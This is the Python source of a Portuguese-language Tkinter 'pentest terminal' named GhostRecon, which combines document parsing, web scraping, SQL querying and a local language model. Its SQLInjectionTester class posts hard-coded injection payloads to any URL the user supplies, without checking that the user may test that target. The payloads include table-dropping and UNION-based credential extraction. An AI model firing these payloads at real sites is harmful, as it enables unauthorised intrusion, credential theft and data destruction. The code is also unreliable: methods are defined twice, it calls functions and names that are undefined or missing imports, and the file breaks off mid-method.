import os
import json
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog, ttk
from PyPDF2 import PdfReader
from docx import Document
from openpyxl import Workbook, load_workbook
from transformers import AutoTokenizer, AutoModelForSeq2SeqLM, pipeline
from bs4 import BeautifulSoup
import validators
import requests
import threading
from queue import Queue
from urllib.parse import urlparse
import time
import pandas as pd
from sqlalchemy import create_engine, inspect, text
from sqlalchemy.exc import SQLAlchemyError
from datetime import datetime
import subprocess
from datetime import datetime
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.platypus import Table, TableStyle
from reportlab.lib import colors
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

class Config:
    MODEL_NAME = "google/flan-t5-small"
    MAX_TOKENS = 2000
    TEMP_DIR = "temp_processing"
    BACKUP_DIR = "backups"


class DatabaseManager:
    def __init__(self, processor):
        self.processor = processor
        self.connection = None
        self.current_db = None

    def connect(self, db_config: dict):
        """Conecta ao banco de dados"""
        try:
            if db_config['dialect'] == 'sqlite':
                engine_str = f"sqlite:///{db_config['database']}"
            else:
                engine_str = f"{db_config['dialect']}://{db_config['user']}:{db_config['password']}@" \
                            f"{db_config['host']}:{db_config['port']}/{db_config['database']}"
            self.connection = create_engine(engine_str)
            return True
        except Exception as e:
            raise Exception(f"Erro de conexão: {str(e)}")

    def execute_query(self, query: str):
        """Executa uma query e retorna os resultados"""
        try:
            with self.connection.connect() as conn:
                result = conn.execute(text(query))
                data = [dict(row) for row in result]
                return data
        except SQLAlchemyError as e:
            raise Exception(f"Erro na execução da query: {str(e)}")
    

    def execute_query(self, query: str):
        """Executa query com confirmação para operações destrutivas"""
        destructive_commands = ['DROP', 'DELETE', 'TRUNCATE', 'UPDATE', 'ALTER']
        if any(cmd in query.upper() for cmd in destructive_commands):
            if not messagebox.askyesno("Confirmação", "Esta operação é destrutiva. Continuar?"):
                return None
        
        try:
            with self.connection.connect() as conn:
                result = conn.execute(text(query))
                if result.returns_rows:
                    return [dict(row) for row in result]
                else:
                    conn.commit()
                    return {"affected_rows": result.rowcount}
        except SQLAlchemyError as e:
            raise Exception(f"Erro na query: {str(e)}")

    def optimize_sql(self, query: str) -> str:
        """Otimiza a query usando IA"""
        prompt = f"Otimize esta query SQL mantendo a funcionalidade:\n{query}\nQuery otimizada:"
        return self.processor.generate_ai_response(prompt)

    def optimize_query(self, query: str):
        """Otimiza uma query SQL usando IA"""
        try:
            optimized = self.processor.db_manager.optimize_sql(query)
            self.update_chat(f"Query otimizada:\n```sql\n{optimized}\n```", "ai")
        except Exception as e:
            self.show_error(str(e))

    def get_schema(self):
        """Retorna o schema do banco conectado"""
        inspector = inspect(self.connection)
        return {
            'tables': [
                {
                    'name': table,
                    'columns': [
                        {'name': col['name'], 'type': str(col['type'])}
                        for col in inspector.get_columns(table)
                    ]
                }
                for table in inspector.get_table_names()
            ]
        }

    def backup_database(self):
        """Cria backup do banco de dados"""
        if not os.path.exists(Config.BACKUP_DIR):
            os.makedirs(Config.BACKUP_DIR)
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_path = os.path.join(Config.BACKUP_DIR, f"backup_{timestamp}.sql")
        
        try:
            if self.current_db['dialect'] == 'sqlite':
                con = sqlite3.connect(self.current_db['database'])
                with open(backup_path, 'w') as f:
                    for line in con.iterdump():
                        f.write('%s\n' % line)
                con.close()
            else:
                subprocess.run([
                    'mysqldump' if self.current_db['dialect'] == 'mysql' else 'pg_dump',
                    '-h', self.current_db['host'],
                    '-u', self.current_db['user'],
                    '-p' + self.current_db['password'],
                    self.current_db['database']
                ], stdout=open(backup_path, 'w'))
            
            return backup_path
        except Exception as e:
            raise Exception(f"Erro no backup: {str(e)}")


    def scrape_database(self, query: str):
        """Faz scraping dos dados do banco e gera análise com IA"""
        try:
            data = self.execute_query(query)
            prompt = (
                "Analise estes dados de banco de dados e gere um resumo estruturado. "
                f"Dados:\n{json.dumps(data[:5], indent=2)}\n\nResposta:"
            )
            analysis = self.processor.generate_ai_response(prompt)
            return {
                "data": data,
                "analysis": analysis,
                "stats": {
                    "row_count": len(data),
                    "columns": list(data[0].keys()) if data else []
                }
            }
        except Exception as e:
            raise Exception(f"Erro no scraping do banco: {str(e)}")


class SQLInjectionTester:
    def __init__(self, processor):
        self.processor = processor
        self.test_cases = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT null, null, null --",
            "' UNION SELECT username, password, null FROM users --",
            "' AND 1=CONVERT(int, (SELECT @@version)) --"
        ]

    def test_injection(self, url: str, form_data: dict):
        """Testa vulnerabilidades de SQL Injection em um formulário web"""
        results = []
        for test_case in self.test_cases:
            try:
                modified_data = {k: test_case for k in form_data.keys()}
                response = requests.post(url, data=modified_data, timeout=10)
                results.append({
                    "test_case": test_case,
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                    "vulnerable": "error" in response.text.lower() or "sql" in response.text.lower()
                })
            except Exception as e:
                results.append({
                    "test_case": test_case,
                    "error": str(e),
                    "vulnerable": False
                })
        return results




class DocumentProcessor:
    def __init__(self):
        self.document_content = ""
        self.scraped_data = {}
        self.chat_context = []
        self.db_manager = DatabaseManager(self)
        self.sql_tester = SQLInjectionTester(self)

        try:
            self.tokenizer = AutoTokenizer.from_pretrained(Config.MODEL_NAME)
            self.model = AutoModelForSeq2SeqLM.from_pretrained(Config.MODEL_NAME)
            self.generator = pipeline(
                'text2text-generation',
                model=self.model,
                tokenizer=self.tokenizer,
                device_map="auto",
                max_length=Config.MAX_TOKENS
            )
        except Exception as e:
            raise Exception(f"Falha ao carregar modelo: {str(e)}")

    def extract_from_file(self, file_path: str) -> str:
        try:
            ext = os.path.splitext(file_path)[1].lower()
            if ext == '.pdf':
                return '\n'.join([page.extract_text() for page in PdfReader(file_path).pages])
            elif ext == '.docx':
                return '\n'.join([para.text for para in Document(file_path).paragraphs])
            elif ext in ('.xlsx', '.xls'):
                wb = load_workbook(file_path)
                return '\n'.join(str(cell.value) for sheet in wb for row in sheet.iter_rows() for cell in row)
            elif ext == '.txt':
                with open(file_path, 'r', encoding='utf-8') as f:
                    return f.read()
            raise Exception("Formato não suportado")
        except Exception as e:
            raise Exception(f"Erro na extração: {str(e)}")

    def export_to_pdf(self, data: dict, filename: str):
        """Exporta dados para PDF com formatação profissional"""
        try:
            c = canvas.Canvas(filename, pagesize=letter)
            width, height = letter
            
            # Cabeçalho
            c.setFillColorRGB(0, 1, 0)  # Verde
            c.setFont("Helvetica-Bold", 16)
            c.drawString(100, height - 100, "Relatório Gerado por GhostRecon")
            c.line(100, height - 110, width - 100, height - 110)
            
            # Conteúdo
            y_position = height - 150
            c.setFont("Helvetica", 12)
            c.setFillColorRGB(1, 1, 1)  # Branco
            
            # Tabela de dados
            if 'data' in data and len(data['data']) > 0:
                table_data = [list(data['data'][0].keys())]  # Cabeçalhos
                for row in data['data']:
                    table_data.append([str(v) for v in row.values()])
                
                t = Table(table_data)
                t.setStyle(TableStyle([
                    ('BACKGROUND', (0,0), (-1,0), colors.green),
                    ('TEXTCOLOR', (0,0), (-1,0), colors.black),
                    ('ALIGN', (0,0), (-1,-1), 'CENTER'),
                    ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0,0), (-1,0), 12),
                    ('BOTTOMPADDING', (0,0), (-1,0), 12),
                    ('BACKGROUND', (0,1), (-1,-1), colors.black),
                    ('TEXTCOLOR', (0,1), (-1,-1), colors.green),
                    ('GRID', (0,0), (-1,-1), 1, colors.green)
                ]))
                
                t.wrapOn(c, width-200, height)
                t.drawOn(c, 100, y_position - len(table_data)*20)
                y_position -= len(table_data)*20 + 50

            # Análise da IA
            if 'analysis' in data:
                c.setFont("Helvetica", 10)
                c.drawString(100, y_position, "Análise da IA:")
                text_object = c.beginText(100, y_position - 20)
                text_object.setFont("Helvetica", 10)
                text_object.setFillColor(colors.green)
                
                for line in data['analysis'].split('\n'):
                    text_object.textLine(line)
                    y_position -= 12
                    if y_position < 100:
                        c.showPage()
                        y_position = height - 100
                        text_object = c.beginText(100, y_position)
                        
                c.drawText(text_object)

            c.save()
            return True
        except Exception as e:
            raise Exception(f"Erro ao gerar PDF: {str(e)}")

    def scrape_website(self, url: str) -> dict:
        try:
            url = url.strip().replace(" ", "")
            if not url:
                raise ValueError("URL não pode estar vazia")
            if not url.startswith(('http://', 'https://')):
                url = f'https://{url}'
            if not validators.url(url):
                raise ValueError(f"URL inválida: {url}")
            parsed_url = urlparse(url)
            if not validators.domain(parsed_url.hostname):
                raise ValueError(f"Domínio inválido: {parsed_url.hostname}")
            response = requests.get(url, timeout=15)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            raw_text = soup.get_text(separator=' ', strip=True)[:4000]
            
            # Processamento com IA para extração estruturada
            ai_prompt = (
                "Extraia informações estruturadas deste site. Campos importantes podem incluir: "
                "nomes, valores, datas, descrições. Formato desejado: JSON com chaves e valores. "
                f"Conteúdo:\n{raw_text}\n\nResposta:"
            )
            
            ai_response = self.generate_ai_response(ai_prompt)
            
            # Tenta converter a resposta da IA para dicionário
            try:
                structured_data = json.loads(ai_response)
            except json.JSONDecodeError:
                structured_data = {"content": ai_response}
            
            # Combina com dados tradicionais
            data = {
                "title": soup.title.string if soup.title else "Sem título",
                "headers": [header.text.strip() for header in soup.find_all(['h1', 'h2', 'h3'])],
                "links": [link.get('href') for link in soup.find_all('a') if link.get('href')],
                "content": raw_text,
                "structured_data": structured_data,
                "ai_analysis": ai_response
            }
            
            return data
        except Exception as e:
            raise Exception(f"Erro no scraping: {str(e)}")

    def generate_ai_response(self, prompt: str) -> str:
        try:
            context = "\n".join(self.chat_context[-3:])
            full_prompt = f"Contexto:\n{context}\n\nNova pergunta:\n{prompt}\nResposta detalhada:"
            
            outputs = self.generator(
                full_prompt,
                temperature=0.85,
                do_sample=True,
                top_k=50,
                top_p=0.95
            )
            response = outputs[0]['generated_text']
            
            self.chat_context.append(f"Usuário: {prompt}")
            self.chat_context.append(f"IA: {response}")
            
            return response
        except Exception as e:
            return f"Erro na geração: {str(e)}"

    def generate_template(self, template_type: str, fields: list) -> str:
        try:
            prompt = (
                f"Crie um template {template_type} com os seguintes campos: {', '.join(fields)}. "
                "Inclua marcações {{campo}} para preenchimento. Formato exemplo:"
                "\n\nPara DOCX:\n[Nome: {{nome}}]\n[Data: {{data}}]"
                "\n\nPara Excel:\n| Nome | Data | Valor |"
            )
            
            response = self.generate_ai_response(prompt)
            
            # Gera arquivo físico
            ext = template_type.lower()
            output_path = os.path.join(Config.TEMP_DIR, f"template_{int(time.time())}.{ext}")
            
            if ext == 'docx':
                doc = Document()
                for line in response.split('\n'):
                    doc.add_paragraph(line)
                doc.save(output_path)
            elif ext == 'xlsx':
                wb = Workbook()
                ws = wb.active
                headers = [field.strip() for field in fields]
                ws.append(headers)
                wb.save(output_path)
            
            return output_path
            
        except Exception as e:
            raise Exception(f"Erro na geração de template: {str(e)}")

    def fill_template(self, template_path: str, output_path: str, data: dict) -> bool:
        try:
            # Combina dados tradicionais e estruturados
            full_data = {
                **data.get('structured_data', {}),
                **{f"raw_{k}": v for k, v in data.items()}
            }
            
            ext = os.path.splitext(template_path)[1].lower()
            if ext == '.docx':
                self.fill_docx_template(template_path, output_path, full_data)
            elif ext in ('.xlsx', '.xls'):
                self.fill_excel_template(template_path, full_data).save(output_path)
            elif ext == '.pdf':
                raise NotImplementedError("Preenchimento de PDF não implementado")
            return True
        except Exception as e:
            raise Exception(f"Erro no template: {str(e)}")

    def fill_docx_template(self, template_path: str, output_path: str, data: dict):
        doc = Document(template_path)
        for para in doc.paragraphs:
            if '{{' in para.text:
                for key, value in data.items():
                    if isinstance(value, list):
                        value = ', '.join(value)
                    para.text = para.text.replace(f'{{{{{key}}}}}', str(value))
        doc.save(output_path)

    def fill_excel_template(self, template_path: str, data: dict):
        wb = load_workbook(template_path)
        for sheet in wb:
            for row in sheet.iter_rows():
                for cell in row:
                    if cell.value and '{{' in str(cell.value):
                        for key, value in data.items():
                            if isinstance(value, list):
                                value = ', '.join(value)
                            cell.value = str(cell.value).replace(f'{{{{{key}}}}}', str(value))
        return wb

    def generate_sql_report(self, data: dict, template_type: str = "auto") -> str:
        """Gera relatórios inteligentes a partir de dados SQL"""
        if template_type == "auto":
            prompt = (
                f"Crie um template de relatório para estes dados SQL:\n"
                f"Colunas: {data['stats']['columns']}\n"
                f"Linhas: {data['stats']['row_count']}\n"
                "Formato: DOCX com tabelas e análise"
            )
            template = self.generate_ai_response(prompt)
        else:
            template = self.load_template(template_type)

        return self.fill_sql_template(template, data)


class Application:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("GhostRecon - Terminal de Pentest")
        self.root.geometry("1200x800")
        self.root.configure(bg='#0a0a0a')
        
        self.processor = DocumentProcessor()
        self.ui_queue = Queue()
        self.progress_window = None
        self.progress_bar = None
        
        self.setup_ui()
        self.setup_ui_handler()
        self.create_animated_title()
        self.current_chart_window = None
        self.tree = None
        self.setup_db_explorer()

    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=40, pady=20)
        
        button_frame = tk.Frame(main_frame, bg='#0a0a0a')
        button_frame.pack(pady=30)
        
        button_style = {
            'font': ('Courier New', 14),
            'width': 18,
            'height': 2,
            'bg': '#003300',
            'fg': '#00ff00',
            'activebackground': '#005500',
            'activeforeground': '#00ff88',
            'relief': 'groove',
            'borderwidth': 4
        }
        
        self.process_file_btn = tk.Button(
            button_frame,
            text="⌗ Processar Arquivo",
            command=self.process_file,
            **button_style
        )
        self.process_file_btn.pack(side=tk.LEFT, padx=15)
        
        self.scrape_btn = tk.Button(
            button_frame,
            text="⌗ Scraping Web",
            command=self.scrape_website,
            **button_style
        )
        self.scrape_btn.pack(side=tk.LEFT, padx=15)
        
        self.chat_btn = tk.Button(
            button_frame,
            text="⌗ Terminal IA",
            command=self.chat_with_ai,
            **button_style
        )
        self.chat_btn.pack(side=tk.LEFT, padx=15)
        
        self.template_btn = tk.Button(
            button_frame,
            text="🧩 Criar Template",
            command=self.create_template,
            **button_style
        )
        self.template_btn.pack(side=tk.LEFT, padx=15)
        
        self.status_var = tk.StringVar()
        self.status_var.set("» Sistema pronto")
        status_label = tk.Label(
            main_frame,
            textvariable=self.status_var,
            font=("Courier New", 12),
            fg="#00ff00",
            bg='#0a0a0a'
        )
        status_label.pack(pady=15)

    def show_progress(self, message: str):
        """Exibe uma janela de progresso com uma barra de carregamento."""
        if self.progress_window is None:
            self.progress_window = tk.Toplevel(self.root)
            self.progress_window.title("Processando")
            self.progress_window.configure(bg='#0a0a0a')
            
            self.progress_label = tk.Label(
                self.progress_window,
                text=message,
                font=("Courier New", 12),
                fg="#00ff00",
                bg='#0a0a0a'
            )
            self.progress_label.pack(padx=30, pady=15)
            
            self.progress_bar = ttk.Progressbar(
                self.progress_window,
                orient=tk.HORIZONTAL,
                length=400,
                mode='determinate',
                style='green.Horizontal.TProgressbar'
            )
            self.progress_bar.pack(pady=15)
            
            style = ttk.Style()
            style.theme_use('clam')
            style.configure(
                'green.Horizontal.TProgressbar',
                background='#00ff00',
                troughcolor='#002200'
            )
            
            self.progress_window.grab_set()

            self.backup_btn = tk.Button(
            button_frame,
            text="💾 Backup",
            command=self.create_backup,
            **button_style
        )
            self.backup_btn.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")

    def update_progress(self, value: int, message: str = None):
        """Atualiza o valor da barra de progresso e a mensagem."""
        if self.progress_bar:
            self.progress_bar['value'] = value
            if message and self.progress_label:
                self.progress_label.config(text=message)
            self.progress_window.update_idletasks()

    def hide_progress(self):
        """Fecha a janela de progresso."""
        if self.progress_window:
            self.progress_window.grab_release()
            self.progress_window.destroy()
            self.progress_window = None
            self.progress_bar = None
            self.progress_label = None

    def process_file(self):
        """Inicia o processamento de arquivo com barra de progresso."""
        self.ui_command('disable_buttons')
        self.ui_command('update_status', "Aguardando seleção de arquivo...")
        file_path = filedialog.askopenfilename(
            filetypes=[("Documentos", "*.pdf *.docx *.xlsx *.txt"), ("Todos", "*.*")]
        )
        if file_path:
            self.ui_command('show_progress', "Processando arquivo...")
            threading.Thread(target=self._process_file, args=(file_path,), daemon=True).start()
        else:
            self.ui_command('enable_buttons')
            self.ui_command('update_status', "Operação cancelada")

    def _process_file(self, file_path: str):
        """Simula o processamento de um arquivo com barra de progresso."""
        try:
            total_steps = 100
            for i in range(total_steps + 1):
                time.sleep(0.05)  # Simula um processamento demorado
                progress = int((i / total_steps) * 100)
                self.ui_command('update_progress', progress, f"Processando... {progress}%")
            
            content = self.processor.extract_from_file(file_path)
            self.processor.document_content = content

            self.ui_command('update_status', "Selecione o template...")
            template_path = filedialog.askopenfilename(
                filetypes=[("Templates", "*.docx *.xlsx *.pdf")]
            )
            if template_path:
                self.ui_command('update_status', "Gerando saída...")
                output_path = filedialog.asksaveasfilename(
                    defaultextension=os.path.splitext(template_path)[1]
                )
                if output_path:
                    self.processor.fill_template(template_path, output_path, {"content": content})
                    self.ui_command('show_info', "Arquivo processado com sucesso!")
        except Exception as e:
            self.ui_command('show_error', str(e))
        finally:
            self.ui_command('hide_progress')
            self.ui_command('update_status', "Pronto para novas operações")
            self.ui_command('enable_buttons')

    def setup_ui_handler(self):
        """Configura o handler para atualizar a interface."""
        def check_queue():
            try:
                while not self.ui_queue.empty():
                    action, *args = self.ui_queue.get_nowait()
                    {
                        'show_progress': lambda: self.show_progress(*args),
                        'update_progress': lambda: self.update_progress(*args),
                        'hide_progress': lambda: self.hide_progress(),
                        'show_error': lambda: self.show_error(*args),
                        'show_info': lambda: self.show_info(*args),
                        'update_status': lambda: self.status_var.set(f"» {args[0]}"),
                        'enable_buttons': lambda: self.enable_buttons(),
                        'disable_buttons': lambda: self.disable_buttons()
                    }[action]()
            except Exception as e:
                print(f"Erro na fila: {str(e)}")
            self.root.after(100, check_queue)

        self.root.after(100, check_queue)
        
    def create_animated_title(self):
        title_frame = tk.Frame(self.root, bg='#0a0a0a')
        title_frame.pack(pady=20)
        
        self.title_label = tk.Label(
            title_frame,
            text="▚▞GhostRecon",
            font=("Courier New", 36),
            fg="#00ff00",
            bg='#0a0a0a'
        )
        self.title_label.pack()
        
        self.subtext_label = tk.Label(
            title_frame,
            text = "By: github.com/Marlon009",
            font=("Courier New", 12),
            fg="#00ff00",
            bg='#0a0a0a'
        )
        self.subtext_label.pack()
        def animate_title():
            symbols = ["▚▞", "▞▚", "▛▟", "▜▙"]
            while True:
                for symbol in symbols:
                    self.title_label.config(text=f"{symbol} GhostRecon")
                    time.sleep(0.5)
                time.sleep(2)
        
        threading.Thread(target=animate_title, daemon=True).start()
        
    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=40, pady=20)

        # Frame para os botões
        button_frame = tk.Frame(main_frame, bg='#0a0a0a')
        button_frame.pack(expand=True)  # Centraliza o frame

        # Configuração do grid para responsividade
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)
        button_frame.grid_columnconfigure(2, weight=1)
        button_frame.grid_rowconfigure(0, weight=1)
        button_frame.grid_rowconfigure(1, weight=1)

        button_style = {
            'font': ('Courier New', 14),
            'width': 22,
            'height': 2,
            'bg': '#003300',
            'fg': '#00ff00',
            'activebackground': '#005500',
            'activeforeground': '#00ff88',
            'relief': 'groove',
            'borderwidth': 4
        }

        # Botões organizados em grid
        self.sql_btn = tk.Button(
            button_frame,
            text="🛢 Conectar SQL",
            command=self.connect_to_sql,
            **button_style
        )
        self.sql_btn.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

        self.pentest_btn = tk.Button(
            button_frame,
            text="🔓 Testar SQL Injection",
            command=self.run_sql_injection_test,
            **button_style
        )
        self.pentest_btn.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")

        self.process_file_btn = tk.Button(
            button_frame,
            text="⌗ Processar Arquivo",
            command=self.process_file,
            **button_style
        )
        self.process_file_btn.grid(row=0, column=2, padx=10, pady=10, sticky="nsew")

        self.scrape_btn = tk.Button(
            button_frame,
            text="⌗ Scraping Web",
            command=self.scrape_website,
            **button_style
        )
        self.scrape_btn.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

        self.chat_btn = tk.Button(
            button_frame,
            text="⌗ Terminal IA",
            command=self.chat_with_ai,
            **button_style
        )
        self.chat_btn.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")

        self.template_btn = tk.Button(
            button_frame,
            text="🧩 Criar Template",
            command=self.create_template,
            **button_style
        )
        self.template_btn.grid(row=1, column=2, padx=10, pady=10, sticky="nsew")

        # Status label
        self.status_var = tk.StringVar()
        self.status_var.set("» Sistema pronto")
        status_label = tk.Label(
            main_frame,
            textvariable=self.status_var,
            font=("Courier New", 12),
            fg="#00ff00",
            bg='#0a0a0a'
        )
        status_label.pack(pady=15)


    def connect_to_sql(self):
        self.ui_command('disable_buttons')
        dialog = tk.Toplevel(self.root)
        dialog.title("Conexão SQL")
        dialog.geometry("500x400")
        
        entries = {}
        fields = [
            ('Tipo (mysql/postgresql/sqlite):', 'dialect'),
            ('Host:', 'host'),
            ('Porta:', 'port'),
            ('Usuário:', 'user'),
            ('Senha:', 'password'),
            ('Banco:', 'database'),
            ('Consulta SQL:', 'query')
        ]
        
        for i, (label, key) in enumerate(fields):
            tk.Label(dialog, text=label).grid(row=i, column=0, padx=5, pady=5)
            entry = tk.Entry(dialog, width=30)
            entry.grid(row=i, column=1, padx=5, pady=5)
            entries[key] = entry

        def execute_query():
            params = {key: entry.get() for key, entry in entries.items()}
            threading.Thread(target=self._process_sql, args=(params,), daemon=True).start()
            dialog.destroy()

        tk.Button(dialog, text="Executar", command=execute_query).grid(row=len(fields)+1, columnspan=2)

    def run_sql_injection_test(self):
        self.ui_command('disable_buttons')
        dialog = tk.Toplevel(self.root)
        dialog.title("Teste de SQL Injection")
        dialog.geometry("500x400")
        
        tk.Label(dialog, text="URL do formulário:").grid(row=0, column=0, padx=5, pady=5)
        url_entry = tk.Entry(dialog, width=40)
        url_entry.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(dialog, text="Campos do formulário (chave=valor):").grid(row=1, column=0, padx=5, pady=5)
        form_entry = tk.Entry(dialog, width=40)
        form_entry.grid(row=1, column=1, padx=5, pady=5)

        def execute_test():
            url = url_entry.get()
            form_data = dict(item.split("=") for item in form_entry.get().split(","))
            threading.Thread(target=self._run_injection_test, args=(url, form_data), daemon=True).start()
            dialog.destroy()

        tk.Button(dialog, text="Testar", command=execute_test).grid(row=2, columnspan=2)

    def _run_injection_test(self, url: str, form_data: dict):
        try:
            self.ui_command('show_progress', "Testando SQL Injection...")
            results = self.processor.sql_tester.test_injection(url, form_data)
            self.ui_command('show_info', f"Testes concluídos! Vulnerabilidades encontradas: {sum(1 for r in results if r['vulnerable'])}")
        except Exception as e:
            self.ui_command('show_error', str(e))
        finally:
            self.ui_command('hide_progress')
            self.ui_command('enable_buttons')
        
    def setup_ui_handler(self):
        def check_queue():
            try:
                while not self.ui_queue.empty():
                    action, *args = self.ui_queue.get_nowait()
                    {
                        'show_progress': lambda: self.show_progress(*args),
                        'hide_progress': lambda: self.hide_progress(),
                        'show_error': lambda: self.show_error(*args),
                        'show_info': lambda: self.show_info(*args),
                        'update_status': lambda: self.status_var.set(f"» {args[0]}"),
                        'enable_buttons': lambda: self.enable_buttons(),
                        'disable_buttons': lambda: self.disable_buttons()
                    }[action]()
            except Exception as e:
                print(f"Erro na fila: {str(e)}")
            self.root.after(100, check_queue)

        self.root.after(100, check_queue)

    def ui_command(self, action, *args):
        self.ui_queue.put((action, *args))

    def show_progress(self, message):
        if self.progress_window is None:
            self.progress_window = tk.Toplevel(self.root)
            self.progress_window.title("Processando")
            self.progress_window.configure(bg='#0a0a0a')
            
            tk.Label(
                self.progress_window,
                text=message,
                font=("Courier New", 12),
                fg="#00ff00",
                bg='#0a0a0a'
            ).pack(padx=30, pady=15)
            
            self.progress_bar = ttk.Progressbar(
                self.progress_window,
                orient=tk.HORIZONTAL,
                length=400,
                mode='indeterminate',
                style='green.Horizontal.TProgressbar'
            )
            self.progress_bar.pack(pady=15)
            self.progress_bar.start()
            
            style = ttk.Style()
            style.theme_use('clam')
            style.configure(
                'green.Horizontal.TProgressbar',
                background='#00ff00',
                troughcolor='#002200'
            )
            
            self.progress_window.grab_set()
            
    def hide_progress(self):
        if self.progress_window:
            self.progress_bar.stop()
            self.progress_window.grab_release()
            self.progress_window.destroy()
            self.progress_window = None
            self.progress_bar = None

    def show_error(self, message):
        messagebox.showerror("Erro de Sistema", message)
        self.ui_command('update_status', f"Erro: {message}")

    def show_info(self, message):
        messagebox.showinfo("Operação Concluída", message)
        self.ui_command('update_status', message)

    def enable_buttons(self):
        self.process_file_btn.config(state=tk.NORMAL)
        self.scrape_btn.config(state=tk.NORMAL)
        self.chat_btn.config(state=tk.NORMAL)
        self.template_btn.config(state=tk.NORMAL)

    def disable_buttons(self):
        self.process_file_btn.config(state=tk.DISABLED)
        self.scrape_btn.config(state=tk.DISABLED)
        self.chat_btn.config(state=tk.DISABLED)
        self.template_btn.config(state=tk.DISABLED)

    def process_file(self):
        self.ui_command('disable_buttons')
        self.ui_command('update_status', "Aguardando seleção de arquivo...")
        file_path = filedialog.askopenfilename(
            filetypes=[("Documentos", "*.pdf *.docx *.xlsx *.txt"), ("Todos", "*.*")]
        )
        if file_path:
            self.ui_command('update_status', "Processando arquivo...")
            threading.Thread(target=self._process_file, args=(file_path,), daemon=True).start()
        else:
            self.ui_command('enable_buttons')
            self.ui_command('update_status', "Operação cancelada")

    def _process_file(self, file_path: str):
        try:
            self.ui_command('show_progress', "Decodificando arquivo...")
            content = self.processor.extract_from_file(file_path)
            self.processor.document_content = content

            data = {"content": content}

            self.ui_command('update_status', "Selecione o template...")
            template_path = filedialog.askopenfilename(
                filetypes=[("Templates", "*.docx *.xlsx *.pdf")]
            )
            if template_path:
                self.ui_command('update_status', "Gerando saída...")
                output_path = filedialog.asksaveasfilename(
                    defaultextension=os.path.splitext(template_path)[1]
                )
                if output_path:
                    self.processor.fill_template(template_path, output_path, data)
                    self.ui_command('show_info', "Arquivo processado com sucesso!")
        except Exception as e:
            self.ui_command('show_error', str(e))
        finally:
            self.ui_command('hide_progress')
            self.ui_command('update_status', "Pronto para novas operações")
            self.ui_command('enable_buttons')

    def scrape_website(self):
        self.ui_command('disable_buttons')
        self.ui_command('update_status', "Aguardando URL...")
        url = simpledialog.askstring("Scraping Web", "Digite a URL do site:")
        if url:
            self.ui_command('update_status', "Analisando site...")
            threading.Thread(target=self._scrape_and_process, args=(url,), daemon=True).start()
        else:
            self.ui_command('enable_buttons')
            self.ui_command('update_status', "Operação cancelada")

    def _scrape_and_process(self, url: str):
        try:
            self.ui_command('show_progress', "Coletando dados do site...")
            data = self.processor.scrape_website(url)
            self.processor.scraped_data = data

            self.ui_command('update_status', "Selecione o template...")
            template_path = filedialog.askopenfilename(
                filetypes=[("Templates", "*.docx *.xlsx *.pdf")]
            )
            if template_path:
                self.ui_command('update_status', "Gerando relatório...")
                output_path = filedialog.asksaveasfilename(
                    defaultextension=os.path.splitext(template_path)[1]
                )
                if output_path:
                    self.processor.fill_template(template_path, output_path, data)
                    self.ui_command('show_info', "Dados processados com sucesso!")
        except Exception as e:
            self.ui_command('show_error', str(e))
        finally:
            self.ui_command('hide_progress')
            self.ui_command('update_status', "Pronto para novas operações")
            self.ui_command('enable_buttons')

    def create_template(self):
        self.ui_command('disable_buttons')
        template_type = simpledialog.askstring(
            "Criar Template",
            "Digite o tipo de template (docx/xlsx) e campos separados por vírgula:\n"
            "Ex: docx, nome, data, valor"
        )
        
        if template_type:
            parts = [p.strip() for p in template_type.split(',')]
            threading.Thread(
                target=self._generate_template_thread,
                args=(parts[0], parts[1:]),
                daemon=True
            ).start()

    def _generate_template_thread(self, template_type: str, fields: list):
        try:
            self.ui_command('show_progress', "Gerando template com IA...")
            output_path = self.processor.generate_template(template_type, fields)
            self.ui_command('show_info', f"Template criado: {output_path}")
        except Exception as e:
            self.ui_command('show_error', str(e))
        finally:
            self.ui_command('hide_progress')
            self.ui_command('enable_buttons')

    def chat_with_ai(self):
        chat_window = tk.Toplevel(self.root)
        chat_window.title("Terminal de Consulta IA")
        chat_window.geometry("1000x700")
        chat_window.configure(bg='#0a0a0a')

        main_frame = tk.Frame(chat_window, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        control_frame = tk.Frame(main_frame, bg='#0a0a0a')
        control_frame.pack(fill=tk.X, pady=10)
        
        upload_btn = tk.Button(
            control_frame,
            text="📁 Carregar Arquivo",
            command=lambda: self.upload_file_for_chat(chat_window),
            bg='#004400',
            fg='#00ff00',
            activebackground='#006600',
            font=('Courier New', 10)
        )
        upload_btn.pack(side=tk.LEFT, padx=5)

        clear_btn = tk.Button(
            control_frame,
            text="🧹 Limpar Contexto",
            command=self.clear_chat_context,
            bg='#440000',
            fg='#ff0000',
            activebackground='#660000',
            font=('Courier New', 10)
        )
        clear_btn.pack(side=tk.LEFT, padx=5)

        self.chat_text = tk.Text(
            main_frame,
            wrap=tk.WORD,
            bg='#001100',
            fg='#00ff00',
            insertbackground='#00ff00',
            font=('Courier New', 12),
            state=tk.DISABLED
        )
        self.chat_text.pack(fill=tk.BOTH, expand=True)

        scrollbar = ttk.Scrollbar(main_frame, command=self.chat_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
